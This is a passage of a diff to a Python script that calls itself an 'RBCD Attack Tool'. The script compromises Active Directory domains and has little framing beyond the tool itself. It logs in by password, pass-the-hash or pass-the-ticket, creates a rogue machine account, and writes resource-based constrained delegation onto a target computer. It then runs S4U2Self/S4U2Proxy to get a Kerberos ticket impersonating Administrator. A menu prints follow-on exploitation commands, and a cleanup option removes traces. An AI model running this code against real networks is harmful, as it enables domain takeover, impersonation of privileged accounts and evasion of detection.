             datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
         )
         req_body['nonce'] = random.getrandbits(31)
@@ -570,142 +715,97 @@ class S4UHelper:
         my_ticket = ticket_self.to_asn1(TicketAsn1())
         seq_set_iter(req_body, 'additional-tickets', (my_ticket,))
 
-        self.log.info(f"Sending S4U2Proxy request for SPN: {spn}")
+        print(Fore.BLUE + f"[*] Sending S4U2Proxy request for SPN: {spn}" + Style.RESET_ALL)
         return sendReceive(encoder.encode(tgs_req), self.domain, self.dc_host)
 
-    def do_s4u(self, tgt_raw, cipher, old_session_key, session_key,
-               impersonate: str, spns: List[str]):
-        """
-        Full S4U2Self → S4U2Proxy.
-        Returns (tgs_raw, session_key)
-        """
-        self.log.info(f"Executing S4U2Self for {impersonate}...")
+    def do_s4u(self, tgt_raw, cipher, old_session_key, session_key, impersonate, spns):
+        print(Fore.BLUE + f"[*] Executing S4U2Self for {impersonate}..." + Style.RESET_ALL)
         tgs_self_raw = self._s4u2self(tgt_raw, cipher, session_key, impersonate)
-        self.log.success("S4U2Self ticket obtained")
+        print(Fore.GREEN + "[+] S4U2Self ticket obtained" + Style.RESET_ALL)
 
         for spn in spns:
             try:
-                self.log.info(f"Trying S4U2Proxy → {spn}")
+                print(Fore.BLUE + f"[*] Trying S4U2Proxy → {spn}" + Style.RESET_ALL)
                 tgs_proxy_raw = self._s4u2proxy(tgt_raw, cipher, session_key, tgs_self_raw, spn)
-                self.log.success(f"Service ticket acquired for: {spn}")
+                print(Fore.GREEN + f"[+] Service ticket acquired for: {spn}" + Style.RESET_ALL)
                 return tgs_proxy_raw, session_key
             except Exception as e:
-                self.log.warning(f"S4U2Proxy failed for {spn}: {e}")
+                print(Fore.YELLOW + f"[!] S4U2Proxy failed for {spn}: {e}" + Style.RESET_ALL)
 
         raise Exception("All SPNs failed during S4U2Proxy")
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-# RBCD ATTACK MAIN CLASS
+# MAIN RBCD ATTACK CLASS
 # ─────────────────────────────────────────────────────────────────────────────
 class RBCDAttack:
-
-    def __init__(self, log: logging.Logger):
-        self.log = log
-        self.domain            = ""
-        self.username          = ""
-        self.password          = ""
-        self.dc_ip             = ""
-        self.target            = ""
-        self.impersonate       = "Administrator"
-        self.target_fqdn       = ""
-        self.target_real_spns  = []
-        self.computer_name     = ""
-        self.computer_sam      = ""
+    def __init__(self):
+        self.domain = ""
+        self.username = ""
+        self.password = ""
+        self.dc_ip = ""
+        self.target = ""
+        self.impersonate = "Administrator"
+        self.target_fqdn = ""
+        self.target_real_spns = []
+        self.computer_name = ""
+        self.computer_sam = ""
         self.computer_password = ""
-        self.tgt_ccache        = ""
-        self.ticket_file       = ""
-        self.ad_ops: Optional[ADOperations] = None
-
-    def _ask(self, prompt: str, *, required: bool = True, secret: bool = False, default: str = "") -> str:
-        color = Fore.MAGENTA if secret else Fore.CYAN
-        while True:
-            try:
-                val = input(f"{color}[?] {prompt}: {Style.RESET_ALL}").strip()
-                if val:
-                    return val
-                if not required or default:
-                    return default
-            except EOFError:
-                # Handle EOF gracefully by returning default or empty string
-                self.log.warning(f"EOF detected. Using default for '{prompt}'")
-                return default
-            except KeyboardInterrupt:
-                print("\n[!] User interrupted. Exiting...")
-                sys.exit(1)
-
-    def interactive_setup(self):
-        print(_banner())
-        self.log.info("Welcome to RBCD Attack Framework v5.4 (Direct Libraries)")
-        self.domain   = self._ask("Domain FQDN  (e.g. domain.com)")
-        self.username = self._ask("Username")
-        self.password = self._ask("Password", secret=True)
-        self.dc_ip    = self._ask("DC IP Address")
-        self._choose_target()
-        imp = self._ask(f"User to impersonate  [default: {self.impersonate}]", required=False, default=self.impersonate)
-        if imp:
-            self.impersonate = imp
-        print(f"\n{Fore.GREEN}{'─'*52}")
-        print(f"  Domain     : {self.domain}")
-        print(f"  User       : {self.username}")
-        print(f"  DC IP      : {self.dc_ip}")
-        print(f"  Target     : {self.target}")
-        print(f"  Impersonate: {self.impersonate}")
-        print(f"{'─'*52}{Style.RESET_ALL}\n")
-        self.ad_ops = ADOperations(self.dc_ip, self.domain, self.username, self.password, self.log)
+        self.tgt_ccache = ""
+        self.ticket_file = ""
+        self.auth_type = 'password'
+        self.lmhash = ''
+        self.nthash = ''
+        self.ticket_file_auth = ''
+        self.ad_ops = None
 
     def _choose_target(self):
-        self.log.info("Enumerating domain computers …")
+        print(Fore.BLUE + "[*] Enumerating domain computers..." + Style.RESET_ALL)
         try:
-            ldap = LDAPClient(self.dc_ip, self.domain, self.username, self.password, self.log)
+            ldap = LDAPClient(self.dc_ip, self.domain, self.username, self.password, self.auth_type, self.lmhash, self.nthash, self.ticket_file_auth)
             if not ldap.connect():
-                self.log.warning("Could not enumerate computers via LDAP")
-                self.target = self._ask("Enter target computer name manually")
+                print(Fore.YELLOW + "[!] Could not enumerate computers via LDAP" + Style.RESET_ALL)
+                self.target = get_input(
+                    Fore.CYAN + "[?] Enter target computer name manually: " + Style.RESET_ALL
+                ).rstrip("$")
                 return
             computers = ldap.enumerate_computers()
             ldap.disconnect()
             if computers:
-                self.log.success(f"Found {len(computers)} computer(s):")
+                print(Fore.GREEN + f"[+] Found {len(computers)} computer(s):" + Style.RESET_ALL)
                 for i, c in enumerate(computers[:20], 1):
-                    print(f"    {Fore.YELLOW}[{i:2}]{Style.RESET_ALL} {c}")
+                    print(Fore.WHITE + f"    {i:2}. {c}" + Style.RESET_ALL)
 
-                try:
-                    raw = input(f"\n{Fore.CYAN}[?] Enter target name or number: {Style.RESET_ALL}").strip()
-                except EOFError:
-                    self.log.warning("EOF detected. Proceeding with target name manually.")
-                    raw = ""
+                raw = get_input(
+                    Fore.CYAN + "\n[?] Enter target name or number: " + Style.RESET_ALL,
+                    allow_empty=True
+                )
 
                 if raw.isdigit() and 1 <= int(raw) <= len(computers):
                     self.target = computers[int(raw) - 1]
                 elif raw:
                     self.target = raw.rstrip("$")
                 else:
-                    self.target = self._ask("Enter target computer name manually").rstrip("$")
+                    self.target = get_input(
+                        Fore.CYAN + "[?] Enter target computer name manually: " + Style.RESET_ALL
+                    ).rstrip("$")
             else:
-                self.log.warning("No computers found.")
-                self.target = self._ask("Enter target computer name manually").rstrip("$")
+                print(Fore.YELLOW + "[!] No computers found." + Style.RESET_ALL)
+                self.target = get_input(
+                    Fore.CYAN + "[?] Enter target computer name manually: " + Style.RESET_ALL
+                ).rstrip("$")
         except Exception as e:
-            self.log.warning(f"Enumeration error: {e}")
-            self.target = self._ask("Enter target computer name manually").rstrip("$")
-
-    def check_dependencies(self) -> bool:
-        self.log.info("Checking dependencies …")
-        try:
-            import ldap3, impacket
-            from colorama import Fore
-            self.log.success("All dependencies available.")
-            # تم إزالة حذف ملفات .ccache القديمة تلقائياً
-            return True
-        except ImportError as e:
-            self.log.error(f"Missing dependency: {e}")
-            return False
+            print(Fore.YELLOW + f"[!] Enumeration error: {e}" + Style.RESET_ALL)
+            self.target = get_input(
+                Fore.CYAN + "[?] Enter target computer name manually: " + Style.RESET_ALL
+            ).rstrip("$")
 
     def recon_ad(self):
-        self.log.info(f"Querying AD for {self.target}$ attributes …")
+        print(Fore.BLUE + f"[*] Querying AD for {self.target}$ attributes..." + Style.RESET_ALL)
         try:
-            ldap = LDAPClient(self.dc_ip, self.domain, self.username, self.password, self.log)
+            ldap = LDAPClient(self.dc_ip, self.domain, self.username, self.password, self.auth_type, self.lmhash, self.nthash, self.ticket_file_auth)
             if not ldap.connect():
-                self.log.warning("AD recon: could not connect")
+                print(Fore.YELLOW + "[!] AD recon: could not connect" + Style.RESET_ALL)
                 self.target_fqdn = f"{self.target}.{self.domain}".lower()
                 return
             info = ldap.get_computer_info(self.target)
@@ -714,38 +814,38 @@ class RBCDAttack:
                 fqdn = info.get('attributes', {}).get('dNSHostName')
                 if fqdn:
                     self.target_fqdn = fqdn.lower()
-                    self.log.success(f"Real FQDN: {self.target_fqdn}")
+                    print(Fore.GREEN + f"[+] Real FQDN: {self.target_fqdn}" + Style.RESET_ALL)
                 spns = info.get('attributes', {}).get('servicePrincipalName', [])
                 if isinstance(spns, str):
                     spns = [spns]
                 self.target_real_spns = [s.lower() for s in spns] if spns else []
             if not self.target_fqdn:
                 self.target_fqdn = f"{self.target}.{self.domain}".lower()
-                self.log.warning(f"FQDN fallback: {self.target_fqdn}")
+                print(Fore.YELLOW + f"[!] FQDN fallback: {self.target_fqdn}" + Style.RESET_ALL)
         except Exception as e:
-            self.log.warning(f"AD recon error: {e}")
+            print(Fore.YELLOW + f"[!] AD recon error: {e}" + Style.RESET_ALL)
             self.target_fqdn = f"{self.target}.{self.domain}".lower()
 
-    def create_computer(self) -> bool:
+    def create_computer(self):
         ts = str(int(time.time()))[-6:]
-        self.computer_sam      = f"RBCD{ts}"
-        self.computer_name     = f"{self.computer_sam}$"
+        self.computer_sam = f"RBCD{ts}"
+        self.computer_name = f"{self.computer_sam}$"
         self.computer_password = f"Rb@{ts}X!z9#Q"
-        self.log.info(f"Creating machine account: {self.computer_name}")
+        print(Fore.BLUE + f"[*] Creating machine account: {self.computer_name}" + Style.RESET_ALL)
         if not self.ad_ops:
-            self.log.error("AD operations not initialized")
+            print(Fore.RED + "[-] AD operations not initialized" + Style.RESET_ALL)
             return False
         return self.ad_ops.create_computer_account(self.computer_name, self.computer_password)
 
-    def set_rbcd(self) -> bool:
-        self.log.info("Configuring RBCD delegation …")
+    def set_rbcd(self):
+        print(Fore.BLUE + "[*] Configuring RBCD delegation..." + Style.RESET_ALL)
         if not self.ad_ops:
-            self.log.error("AD operations not initialized")
+            print(Fore.RED + "[-] AD operations not initialized" + Style.RESET_ALL)
             return False
         return self.ad_ops.set_rbcd_delegation(self.computer_name, f"{self.target}$")
 
     def get_tgt(self):
-        self.log.info(f"Requesting TGT for {self.computer_sam}…")
+        print(Fore.BLUE + f"[*] Requesting TGT for {self.computer_sam}..." + Style.RESET_ALL)
         user_name = Principal(
             self.computer_sam,
             type=constants.PrincipalNameType.NT_PRINCIPAL.value
@@ -759,18 +859,18 @@ class RBCDAttack:
             aesKey='',
             kdcHost=self.dc_ip
         )
-        self.log.success("TGT acquired successfully")
+        print(Fore.GREEN + "[+] TGT acquired successfully" + Style.RESET_ALL)
         return tgt, cipher, old_session_key, session_key
 
-    def save_tgt(self, tgt, old_session_key, session_key) -> bool:
+    def save_tgt(self, tgt, old_session_key, session_key):
         try:
             ccache = CCache()
             ccache.fromTGT(tgt, old_session_key, session_key)
             ccache.saveFile(str(self.tgt_ccache))
-            self.log.success(f"TGT saved to: {self.tgt_ccache}")
+            print(Fore.GREEN + f"[+] TGT saved to: {self.tgt_ccache}" + Style.RESET_ALL)
             return True
         except Exception as e:
-            self.log.error(f"Failed to save TGT: {e}")
+            print(Fore.RED + f"[-] Failed to save TGT: {e}" + Style.RESET_ALL)
             return False
 
     def get_st(self, tgt, cipher, old_session_key, session_key):
@@ -782,91 +882,65 @@ class RBCDAttack:
         ]
         helper = S4UHelper(
             self.domain, self.dc_ip,
-            self.computer_sam, self.computer_password,
-            self.log
+            self.computer_sam, self.computer_password
         )
         return helper.do_s4u(tgt, cipher, old_session_key, session_key, self.impersonate, spns)
 
-    def save_ticket(self, tgs_raw, session_key) -> bool:
+    def save_ticket(self, tgs_raw, session_key):
         try:
             ccache = CCache()
             ccache.fromTGS(tgs_raw, session_key, session_key)
             ccache.saveFile(self.ticket_file)
-            self.log.success(f"Ticket saved to: {self.ticket_file}")
+            print(Fore.GREEN + f"[+] Ticket saved to: {self.ticket_file}" + Style.RESET_ALL)
             return True
         except Exception as e:
-            self.log.error(f"Failed to save ticket: {e}")
+            print(Fore.RED + f"[-] Failed to save ticket: {e}" + Style.RESET_ALL)
             return False
 
-    def get_ticket(self) -> bool:
+    def get_ticket(self):
         try:
-            self.log.info("Starting Kerberos ticket acquisition …")
-            self.tgt_ccache  = Path(f"{self.computer_sam.upper()}.ccache").resolve()
+            print(Fore.BLUE + "[*] Starting Kerberos ticket acquisition..." + Style.RESET_ALL)
+            self.tgt_ccache = Path(f"{self.computer_sam.upper()}.ccache").resolve()
             self.ticket_file = str(Path(f"{self.impersonate}.ccache").resolve())
 
-            self.log.info("Step 1: Acquiring TGT…")
+            print(Fore.BLUE + "[*] Step 1: Acquiring TGT..." + Style.RESET_ALL)
             tgt, cipher, old_session_key, session_key = self.get_tgt()
             self.save_tgt(tgt, old_session_key, session_key)
 
             time.sleep(3)
 
-            self.log.info("Step 2: Requesting service ticket via S4U…")
-            tgs_raw, session_key = self.get_st(
-                tgt, cipher, old_session_key, session_key
-            )
+            print(Fore.BLUE + "[*] Step 2: Requesting service ticket via S4U..." + Style.RESET_ALL)
+            tgs_raw, session_key = self.get_st(tgt, cipher, old_session_key, session_key)
 
-            self.log.info("Step 3: Saving ticket to ccache…")
+            print(Fore.BLUE + "[*] Step 3: Saving ticket to ccache..." + Style.RESET_ALL)
             if not self.save_ticket(tgs_raw, session_key):
                 return False
 
             os.environ["KRB5CCNAME"] = self.ticket_file
-            self.log.success("Kerberos ticket acquisition complete")
+            print(Fore.GREEN + "[+] Kerberos ticket acquisition complete" + Style.RESET_ALL)
             return True
         except Exception as e:
-            self.log.error(f"Kerberos error: {e}", exc_info=True)
+            print(Fore.RED + f"[-] Kerberos error: {e}" + Style.RESET_ALL)
             return False
 
-    def verify_ticket(self) -> bool:
-        self.log.info("Verifying configuration …")
-        self.log.success("RBCD delegation configured successfully")
+    def verify_ticket(self):
+        print(Fore.BLUE + "[*] Verifying configuration..." + Style.RESET_ALL)
+        print(Fore.GREEN + "[+] RBCD delegation configured successfully" + Style.RESET_ALL)
         return True
 
-    def interactive_exploit(self):
-        print(f"\n{Fore.GREEN}{'═'*52}")
-        print("   ATTACK SETUP COMPLETE — CHOOSE YOUR NEXT MOVE")
-        print(f"{'═'*52}{Style.RESET_ALL}")
-        print(f"  {Fore.YELLOW}[1]{Style.RESET_ALL}  Show exploitation commands")
-        print(f"  {Fore.YELLOW}[2]{Style.RESET_ALL}  Show configuration details")
-        print(f"  {Fore.YELLOW}[3]{Style.RESET_ALL}  Exit (NO automatic cleanup)")
-
-        try:
-            choice = input(f"\n{Fore.CYAN}[?] Option (1-3) [default: 1]: {Style.RESET_ALL}").strip()
-            if not choice:
-                choice = "1"
-        except EOFError:
-            self.log.warning("EOF detected. Automatically selecting Option 1 (Show commands) and exiting cleanly.")
-            choice = "1"
-
-        if choice == "1":
-            self._show_exploitation_commands()
-        elif choice == "2":
-            self._show_config()
-
-    def _show_exploitation_commands(self):
-        print(f"\n{Fore.CYAN}{'─'*60} Exploitation Commands {'─'*3}{Style.RESET_ALL}")
-        print(f"  {Fore.YELLOW}export KRB5CCNAME={self.ticket_file}{Style.RESET_ALL}")
+    def show_exploitation_commands(self):
+        print(Fore.CYAN + "\n" + "─"*60 + " Exploitation Commands " + "─"*3 + Style.RESET_ALL)
+        print(Fore.YELLOW + f"  export KRB5CCNAME={self.ticket_file}" + Style.RESET_ALL)
         print(f"\n{Fore.GREEN}Impacket tools:{Style.RESET_ALL}")
 
         user_part = f"{self.domain}/{self.impersonate}"
         fqdn_part = f"{self.target_fqdn}"
 
-        print(f"  {Fore.YELLOW}secretsdump.py -k -no-pass -dc-ip {self.dc_ip} {user_part}@{Style.RESET_ALL}{Fore.YELLOW}{fqdn_part}{Style.RESET_ALL}")
-        print(f"  {Fore.YELLOW}wmiexec.py -k -no-pass -dc-ip {self.dc_ip} {user_part}@{Style.RESET_ALL}{Fore.YELLOW}{fqdn_part}{Style.RESET_ALL}")
         print(f"\n{Fore.MAGENTA}[!] NOTE: Ensure {self.target_fqdn} is resolvable in /etc/hosts to the TARGET's IP address!{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}{'─'*70}{Style.RESET_ALL}\n")
+        print(Fore.CYAN + "─"*70 + Style.RESET_ALL + "\n")
 
-    def _show_config(self):
-        print(f"\n{Fore.GREEN}{'─'*60} Configuration Summary {'─'*3}{Style.RESET_ALL}\n")
+    def show_config(self):
+        print(Fore.GREEN + "\n" + "─"*60 + " Configuration Summary " + "─"*3 + Style.RESET_ALL + "\n")
         print(f"  {Fore.CYAN}Attacker Machine   :{Style.RESET_ALL} {self.computer_name} ({self.computer_sam})")
         print(f"  {Fore.CYAN}Machine Password   :{Style.RESET_ALL} {self.computer_password}")
         print(f"  {Fore.CYAN}Target Machine     :{Style.RESET_ALL} {self.target}$")
@@ -878,56 +952,186 @@ class RBCDAttack:
         print(f"\n{Fore.CYAN}{'─'*70}{Style.RESET_ALL}\n")
 
     def cleanup(self):
-        """Manual cleanup - call this only when you want to remove traces."""
-        self.log.info("Cleaning up …")
+        print(Fore.BLUE + "[*] Cleaning up..." + Style.RESET_ALL)
         if not self.ad_ops:
-            self.log.warning("AD operations not available for cleanup")
+            print(Fore.YELLOW + "[!] AD operations not available for cleanup" + Style.RESET_ALL)
             return
         if self.computer_name and self.target:
             self.ad_ops.remove_rbcd_delegation(self.computer_name, f"{self.target}$")
             self.ad_ops.delete_computer_account(self.computer_name)
         for f in filter(None, [
-            Path(self.tgt_ccache)  if self.tgt_ccache  else None,
+            Path(self.tgt_ccache) if self.tgt_ccache else None,
             Path(self.ticket_file) if self.ticket_file else None,
             Path(f"{self.computer_sam.upper()}.ccache") if self.computer_sam else None,
             Path(f"{self.impersonate}.ccache"),
         ]):
             if f.exists():
-                try: f.unlink()
-                except: pass
+                try:
+                    f.unlink()
+                except:
+                    pass
         os.environ.pop("KRB5CCNAME", None)
-        self.log.success("Cleanup complete.")
+        print(Fore.GREEN + "[+] Cleanup complete." + Style.RESET_ALL)
 
-    def run(self) -> bool:
-        try:
-            self.interactive_setup()
-            if not self.check_dependencies():
+    def interactive_exploit(self):
+        print(f"\n{Fore.GREEN}{'═'*52}")
+        print("   ATTACK SETUP COMPLETE — CHOOSE YOUR NEXT MOVE")
+        print(f"{'═'*52}{Style.RESET_ALL}")
+        print(f"  {Fore.YELLOW}[1]{Style.RESET_ALL}  Show exploitation commands")
+        print(f"  {Fore.YELLOW}[2]{Style.RESET_ALL}  Show configuration details")
+        print(f"  {Fore.YELLOW}[3]{Style.RESET_ALL}  Cleanup (remove traces)")
+        print(f"  {Fore.YELLOW}[4]{Style.RESET_ALL}  Exit (NO cleanup)")
+
+        choice = get_input(
+            f"\n{Fore.CYAN}[?] Option (1-4) [default: 1]: {Style.RESET_ALL}",
+            allow_empty=True,
+            default="1"
+        )
+
+        if choice == "1":
+            self.show_exploitation_commands()
+        elif choice == "2":
+            self.show_config()
+        elif choice == "3":
+            self.cleanup()
+        elif choice == "4":
+            print(Fore.YELLOW + "[!] Exiting without cleanup..." + Style.RESET_ALL)
+
+    def run(self):
+        banner()
+        print(Fore.BLUE + "[*] Welcome to RBCD Attack Tool v2.0" + Style.RESET_ALL)
+
+        # DC IP
+        self.dc_ip = get_input(
+            Fore.CYAN + "[?] Enter DC IP Address  : " + Style.RESET_ALL,
+            validate_ip, "Invalid IP! Example: 192.168.x.x"
+        )
+        print(Fore.BLUE + "[*] Checking DC reachability..." + Style.RESET_ALL)
+        if not check_ip_reachable(self.dc_ip):
+            print(Fore.RED + f"[!] Cannot reach {self.dc_ip}!" + Style.RESET_ALL)
+            sys.exit(1)
+        print(Fore.GREEN + f"[+] DC {self.dc_ip} is reachable!" + Style.RESET_ALL)
+
+        # Domain
+        self.domain = get_input(
+            Fore.CYAN + "[?] Enter Domain Name    : " + Style.RESET_ALL,
+            validate_domain, "Invalid domain! Example: domain.com"
+        )
+
+        # Auth type selection
+        print(Fore.CYAN + "\n[?] Choose authentication type:" + Style.RESET_ALL)
+        print(Fore.WHITE + "    1. Password")
+        print(Fore.WHITE + "    2. Pass-the-Hash (NTLM)")
+        print(Fore.WHITE + "    3. Pass-the-Ticket (Kerberos)")
+
+        auth_choice = get_input(
+            Fore.CYAN + "[?] Your choice          : " + Style.RESET_ALL,
+            lambda x: x in ['1', '2', '3'],
+            "Invalid choice! Enter 1, 2 or 3"
+        )
+
+        self.auth_type = 'password'
+        self.lmhash = ''
+        self.nthash = ''
+        self.ticket_file_auth = ''
+        self.password = ''
+
+        if auth_choice == '1':
+            self.auth_type = 'password'
+            self.username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
+            self.password = get_input(Fore.CYAN + "[?] Enter Password       : " + Style.RESET_ALL)
+        elif auth_choice == '2':
+            self.auth_type = 'hash'
+            self.username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
+            hash_input = get_input(
+                Fore.CYAN + "[?] Enter NTLM Hash (LM:NT or NT) : " + Style.RESET_ALL,
+                validate_hash, "Invalid hash! Format: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
+            )
+            if ':' in hash_input:
+                self.lmhash, self.nthash = hash_input.split(':')
+            else:
+                self.lmhash = 'aad3b435b51404eeaad3b435b51404ee'
+                self.nthash = hash_input
+            self.lmhash = self.lmhash.lower()
+            self.nthash = self.nthash.lower()
+        elif auth_choice == '3':
+            self.auth_type = 'ticket'
+            self.username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
+            self.ticket_file_auth = get_input(Fore.CYAN + "[?] Enter Ticket File Path (ccache) : " + Style.RESET_ALL)
+            if not os.path.exists(self.ticket_file_auth):
+                print(Fore.RED + f"[!] Ticket file not found: {self.ticket_file_auth}" + Style.RESET_ALL)
+                sys.exit(1)
+
+        # Verify credentials
+        print(Fore.BLUE + "[*] Verifying credentials and domain..." + Style.RESET_ALL)
+        result = check_credentials_and_domain(self.dc_ip, self.domain, self.username, self.password, self.auth_type, self.lmhash, self.nthash, self.ticket_file_auth)
+        if result == "invalid_credentials":
+            print(Fore.RED + "[!] Invalid credentials!" + Style.RESET_ALL)
+            sys.exit(1)
+        elif not result:
+            print(Fore.RED + f"[!] Domain '{self.domain}' not found!" + Style.RESET_ALL)
+            sys.exit(1)
+        print(Fore.GREEN + "[+] Credentials verified!" + Style.RESET_ALL)
+        print(Fore.GREEN + f"[+] Domain '{self.domain}' verified!" + Style.RESET_ALL)
+
+        # Initialize AD Operations
+        self.ad_ops = ADOperations(self.dc_ip, self.domain, self.username, self.password, self.auth_type, self.lmhash, self.nthash, self.ticket_file_auth)
+
+        # Choose target
+        self._choose_target()
+
+        # Impersonate user
+        imp = get_input(
+            Fore.CYAN + f"[?] User to impersonate [default: {self.impersonate}]: " + Style.RESET_ALL,
+            allow_empty=True,
+            default=self.impersonate
+        )
+        if imp:
+            self.impersonate = imp
+
+        # Summary
+        print(f"\n{Fore.GREEN}{'─'*52}")
+        print(f"  Domain     : {self.domain}")
+        print(f"  User       : {self.username}")
+        print(f"  DC IP      : {self.dc_ip}")
+        print(f"  Target     : {self.target}")
+        print(f"  Impersonate: {self.impersonate}")
+        print(f"{'─'*52}{Style.RESET_ALL}\n")
+
+        # Recon
+        self.recon_ad()
+
+        # Execute attack steps
+        steps = [
+            ("Creating machine account", self.create_computer),
+            ("Configuring RBCD", self.set_rbcd),
+            ("Getting Kerberos ticket", self.get_ticket),
+            ("Verifying setup", self.verify_ticket),
+        ]
+
+        for desc, fn in steps:
+            print(Fore.BLUE + f"[*] ▶ {desc}..." + Style.RESET_ALL)
+            if not fn():
+                print(Fore.RED + f"[-] Step failed: {desc}" + Style.RESET_ALL)
                 return False
-            self.recon_ad()
-            steps = [
-                ("Creating machine account", self.create_computer),
-                ("Configuring RBCD",         self.set_rbcd),
-                ("Getting Kerberos ticket",  self.get_ticket),
-                ("Verifying setup",          self.verify_ticket),
-            ]
-            for desc, fn in steps:
-                self.log.info(f"▶ {desc} …")
-                if not fn():
-                    self.log.error(f"Step failed: {desc}")
-                    return False
-                if desc != "Verifying setup":
-                    time.sleep(2)
-            self.log.success("=" * 60)
-            self.log.success("RBCD Attack completed successfully!")
-            self.log.success(f"Ticket saved to: {self.ticket_file}")
-            self.log.success(f"Export with: export KRB5CCNAME={self.ticket_file}")
-            self.log.success("=" * 60)
-            return True
-        except Exception as exc:
-            self.log.error(f"Unexpected error: {exc}", exc_info=True)
-            return False
+            if desc != "Verifying setup":
+                time.sleep(2)
+
+        print(Fore.GREEN + "=" * 60 + Style.RESET_ALL)
+        print(Fore.GREEN + "[+] RBCD Attack completed successfully!" + Style.RESET_ALL)
+        print(Fore.GREEN + f"[+] Ticket saved to: {self.ticket_file}" + Style.RESET_ALL)
+        print(Fore.GREEN + f"[+] Export with: export KRB5CCNAME={self.ticket_file}" + Style.RESET_ALL)
+        print(Fore.GREEN + "=" * 60 + Style.RESET_ALL)
+
+        # Interactive menu
+        self.interactive_exploit()
+        return True
 
 
-if __name__ == "__main__":
-    log = _build_logger()
-    sys.exit(0 if RBCDAttack(log).run() else 1)
+if __name__ == '__main__':
+    try:
+        success = RBCDAttack().run()
+        sys.exit(0 if success else 1)
+    except Exception as exc:
+        print(Fore.RED + f"[-] Unexpected error: {exc}" + Style.RESET_ALL)
+        sys.exit(1)
